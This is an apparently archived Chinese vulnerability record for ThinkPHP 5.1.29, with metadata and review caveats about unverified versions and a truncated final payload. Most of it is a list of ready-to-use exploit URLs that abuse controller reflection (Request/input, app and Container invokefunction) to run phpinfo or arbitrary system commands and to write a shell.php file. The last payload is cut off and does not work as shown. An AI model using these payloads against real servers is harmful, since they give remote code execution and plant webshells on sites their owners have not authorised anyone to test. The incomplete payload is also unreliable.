---
source: "hatch 补库批 20260928"
product: "ThinkPHP / 控制器反射"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Thinkphp 5.1.29"
prerequisites: "来源所述条件，未列明部分仍待核：标题5.1.29，八条不同类方法需各自版本条件"
side_effects: "未执行；本文需注意的操作影响：类型混写和分支泛化；Php/display是解释输出而非文件写入；App方法不应自动视为5.1通用"
source_status: "unknown"
id: "vw-db49b26e73b94fd99a50df20"
entity_id: "ve-db49b26e73b94fd99a50df20"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：标题5.1.29，八条不同类方法需各自版本条件

代码与实验材料：Request/App/Container、File/write、Php/display；最后载荷被截断，无响应

来源证据范围：仅hatch标签

- **代码与转录边界（1）**：最后一条PHP载荷不完整；依据：display内容末尾?%3，URL编码和结束符截断。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **操作与副作用边界（2）**：类型混写和分支泛化；依据：Php/display是解释输出而非文件写入；App方法不应自动视为5.1通用。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

- **实验改动边界（3）**：缺来源及未强制路由条件；依据：仅版本标题和载荷不能建立默认远程入口证据。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Thinkphp 5.1.29

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 1、代码执行

    http://www.0-sec.org/?s=index/\think\Request/input&filter=phpinfo&data=1

    http://www.0-sec.org/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

    http://www.0-sec.org/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

### 2、命令执行

    http://www.0-sec.org/?s=index/\think\Request/input&filter=system&data=操作系统命令

    http://www.0-sec.org/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令

    http://www.0-sec.org/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令

### 3、文件写入

    http://www.0-sec.org/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E

    http://www.0-sec.org/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3
